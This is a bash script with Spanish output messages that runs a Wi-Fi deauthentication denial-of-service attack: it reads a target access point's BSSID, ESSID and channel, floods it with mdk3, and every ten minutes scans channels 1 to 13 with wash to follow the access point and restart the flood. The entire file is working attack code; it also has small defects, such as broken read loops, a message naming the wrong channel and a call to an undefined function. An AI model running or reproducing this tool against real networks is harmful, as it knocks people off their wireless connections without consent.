#!/bin/bash
echo $$ >/tmp/terminal.pid

#####################################################

f_variables(){
intmoniteur="$(cat cartedos.txt)"
canal="$(cat apcanal.txt)"
BSSID="$(cat apmac.txt)"
ESSID="$(cat ssid.txt)"
echo "$intmoniteur"
while [ -z "${intmoniteur}" ]; do read -r ${intmoniteur}; done



echo "$canal"
while [ -z "${canal}" ]; do read -r ${canal}; done



echo "$BSSID"
while [ -z ${BSSID} ]; do read -r ${BSSID}; done



echo "$ESSID"
while [ -z "${ESSID}" ]; do read -r ${ESSID}; done
f_floodinstantane
}


#####################################################

f_checkap(){              
wash -i ${intmoniteur} -a -c ${canal} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] El PA no ha cambiado de canal, reiniciando la DoS..."
sleep 1;
kill `cat /tmp/mdk3.pid`
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] El PA ha cambiado de canal... Se está buscando...\e[0m"
sleep 1;
rm -rf output.txt
kill `cat /tmp/mdk3.pid`
kill `cat /tmp/airodump.pid`
sleep 5;
fi

canal=1
wash -i ${intmoniteur} -a -c ${canal} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then  
   echo -e "\t\e[1;32m [+] El PA está en el canal 1, reiniciando la DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] El PA no está en canal 1... Se sigue buscando...\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=11
wash -i ${intmoniteur} -a -c ${canal} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] El PA está en el canal 11, reiniciando la DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] El PA no está en canal 11... Se sigue buscando...\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=6
wash -i ${intmoniteur} -a -c ${canal} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then  
   echo -e "\t\e[1;32m [+] El PA está en el canal 6, reiniciando la DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] El PA no está en canal 6... Se sigue buscando...\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt*
fi

canal=13
wash -i ${intmoniteur} -a -c ${canal} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then  
   echo -e "\t\e[1;32m [+] El AP está en el canal 13, reiniciando la DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] El PA no está en canal 13... Se sigue buscando...\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=5
wash -i ${intmoniteur} -a -c ${canal} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then  
   echo -e "\t\e[1;32m [+] El PA está en el canal 5, reiniciando la DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] El PA no está en canal 3... Se sigue buscando...\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=12
wash -i ${intmoniteur} -a -c ${canal} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] El PA está en el canal 12, reiniciando la DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] El PA no está en los canales  1 3 6 9 11 o 13... --FALLO DEL ATAQUE-- ¡Toma el control manualmente!\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=3
wash -i ${intmoniteur} -a -c ${canal} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] El PA está en el canal 3, reiniciando la DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] El PA no está en los canales  1 3 6 9 11 o 13... --FALLO DEL ATAQUE-- ¡Toma el control manualmente!\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=10
wash -i ${intmoniteur} -a -c ${canal} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] El PA está en el canal 10, reiniciando la DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] El PA no está en los canales  1 3 6 9 11 o 13... --FALLO DEL ATAQUE-- ¡Toma el control manualmente!\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=7
wash -i ${intmoniteur} -a -c ${canal} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] El PA está en el canal 7, reiniciando la DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] El PA no está en los canales  1 3 6 9 11 o 13... --FALLO DEL ATAQUE-- ¡Toma el control manualmente!\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=2
wash -i ${intmoniteur} -a -c ${canal} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] El PA está en el canal 2, reiniciando la DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] El PA no está en los canales  1 3 6 9 11 o 13... --FALLO DEL ATAQUE-- ¡Toma el control manualmente!\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=8
wash -i ${intmoniteur} -a -c ${canal} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then  
   echo -e "\t\e[1;32m [+] El PA está en el canal 8, reiniciando la DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] El PA no está en los canales  1 3 6 9 11 o 13... --FALLO DEL ATAQUE-- ¡Toma el control manualmente!\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=4
wash -i ${intmoniteur} -a -c ${canal} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] El PA está en el canal 4, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] El PA no está en los canales  1 3 6 9 11 o 13... --FALLO DEL ATAQUE-- ¡Toma el control manualmente!\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=9
wash -i ${intmoniteur} -a -c ${canal} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] El PA está en el canal 9, reiniciando la DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] El PA no está en los canales  1 3 6 9 11 o 13... --FALLO DEL ATAQUE-- ¡Toma el control manualmente!\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi
}

#####################################################

f_floodinstantane(){       # boucle 1 qui test le contenu du fichier en appelant la fonction boucle 2 toute les x seconde  (fonction juste au dessus f_checkap)
           echo -e "\e[1;34m[*]\e[0m Iniciando la DoS... Se comprobará el canal del PA cada x segundos, x siendo el valor que has entrado..."
sleep 1;
xterm -hold -bg '#000000' -fg '#3A94FF' -e mdk3 ${intmoniteur} d -c ${canal} &> /dev/null &
echo $! >/tmp/mdk3.pid
sleep 4;
while : ; do
sleep 600 ; f_checkap ; done
}


#####################################################
f_activedos(){
clear
echo "1.  Dos"
read -p "Choix: " menuchoix
case ${menuchoix} in
1) unset clean; f_floodinterface ;;
*) f_activedos ;;
esac
}


# run as root
if [ "$(id -u)" != "0" ]; then
	echo -e "\e[1;31m[]\e[0m Debes ejecutar hostbase con privilegios de administrador" 1>&2
	exit 1
else
	clean=1
	f_variables
fi
